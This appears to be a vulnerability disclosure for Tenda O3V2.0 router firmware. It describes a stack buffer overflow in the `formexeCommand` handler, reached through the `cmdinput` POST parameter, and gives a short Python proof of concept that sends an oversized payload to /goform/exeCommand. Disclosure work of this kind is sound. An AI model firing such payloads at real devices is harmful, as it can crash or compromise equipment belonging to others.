## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2832.html

## Affected version

O3V2.0 V1.0.0.10(2478)

## Vulnerability details

In the O3V2.0 V1.0.0.10(2478) firmware has a stack overflow vulnerability in the `formexeCommand` function. The `src` variable receives the `cmdinput` parameter from a POST request. However, since the user can control the input of `cmdinput`, the statement `strcpy(s + 16, src);` can cause a buffer overflow. The user-provided  `cmdinput` can exceed the capacity of the `s` array, triggering this security vulnerability.

![image-20240714213615842](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213615842.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/exeCommand"
payload = b"a"*2000

data = {"cmdinput": payload}
response = requests.post(url, data=data)
```

![image-20240714213455164](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240714213455164.png)
